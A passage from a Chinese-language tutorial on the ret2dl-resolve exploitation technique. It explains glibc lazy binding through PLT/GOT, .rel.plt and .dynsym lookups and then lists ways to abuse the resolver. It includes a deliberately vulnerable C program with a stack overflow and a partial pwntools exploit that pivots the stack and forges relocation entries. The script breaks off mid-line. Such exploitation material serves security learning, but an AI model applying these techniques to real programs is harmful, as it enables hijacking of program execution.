        // 最后把value写入相应的GOT表条目中
        return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
    }
综上所述，过程是这样的
1、第一次执行函数，去plt表，接着去got表，由于没有真实地址，又返回plt表的第一项，压入reloc_arg和link_map后调用_dl_runtime_resolve(link_map,
reloc_arg)
2、link_map访问.dynamic节段，并获得.dynstr, .dynsym, .rel.plt节段的地址
3、.rel.plt + reloc_arglt=0，求出对应函数重定位表项Elf32_Rel的指针，这里puts的是：
    重定位节 '.rela.plt' 位于偏移量 0x440 含有 6 个条目：
      偏移量          信息           类型           符号值         符号名称 + 加数
    000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
    000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
    000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
    000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
    000000601038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
    000000601040  000700000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
4、通过重定位表项Elf32_Rel的指针，得到对应函数的r_info，r_info >>
8作为.dynsym的下标（这里puts是1），求出当前函数的符号表项Elf32_Sym的指针：
    Symbol table '.dynsym' contains 8 entries:
       Num:    Value          Size Type    Bind   Vis      Ndx Name
         0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
         1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
         2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3)
         3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
         4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)
         5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
         6: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
         7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)
5、利用Elf32_Sym的指针得到对应的st_name，.dynstr + st_name即为符号名字符串指针
6、在动态链接库查找这个函数，并且把地址赋值给.rel.plt中对应条目的r_offset：指向对应got表的指针，由此puts的got表就被写上了真实的地址
7、赋值给GOT表后，把程序流程返回给puts
# 利用操作
通过上面的分析，其实很关键的一点，就是要先从plt[0]开始这一切
因此我们在利用的时候首先要做的是把程序流程给跳到plt[0]中
然后根据上面的7步流程中，可以分析出有三种利用的方法
  * 伪造ink_map使得dynamic指向我们可以控制的地方
  * 改写.dynamic的DT_STRTAB指向我们可以控制的地方
  * 伪造reloc_arg，也就是伪造一个很大的`.rel.plt`offset，使得加上去之后的地址指向我们可以控制的地方
这里一般都用最后一种，因为前两种要求完全没开RELRO保护，但一般都会开Partial RELRO，这样都直接导致.dynamic不可写
这里用这个小程序来测试一下
    #include 
    #include 
    void vul()
    {
        char buf[28];
        read(0, buf, 128);
    }
    int main()
    {
        char name[]="input your name!\n";
        write(1,name,strlen(name));
        vul();
    }
    //gcc  -m32 -fno-stack-protector main.c -o main32
用一张图来解释exp的利用流程，应该非常清楚了
exp:如下
    #coding=utf-8
    from pwn import*
    context.log_level = 'debug'
    p = process('./main32')
    elf =ELF("./main32")
    def debug(addr=''):
        gdb.attach(p,'')
        pause()
    bss = elf.bss()
    ppp_ret = 0x08048549 
    pop_ebp_ret = 0x0804854b
    leave_ret = 0x080483d8
    PLT = 0x8048310
    rel_plt = 0x80482CC
    elf_dynsym = 0x080481CC
    elf_dynstr = 0x0804823c
    stack_addr = bss + 0x300
    read_plt = elf.plt['read']
    write_plt = elf.plt['write']
    def exp():
        payload = 'a' * (0x24+4)
        payload += p32(read_plt)#read(0,stack_addr,100) 
        payload += p32(ppp_ret)
        payload += p32(0)
        payload += p32(stack_addr)
        payload += p32(100)
        payload += p32(pop_ebp_ret)
        payload += p32(stack_addr)
        payload += p32(leave_ret)#esp指向stack_addr
        p.recvuntil("input your name!\n")
        p.sendline(payload)
        index_offset = (stack_addr + 28) - rel_plt
        write_got = elf.got['write']
        #伪造dynsym
        fake_dynsym = stack_addr + 36
        align = 0x10 - ((fake_dynsym - elf_dynsym) & 0xf)#
        fake_dynsym = fake_dynsym + align
        #这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
        index_dynsym_addr = (fake_dynsym - elf_dynsym) / 0x10#dynsym下标
        r_info = (index_dynsym_addr 
# 参考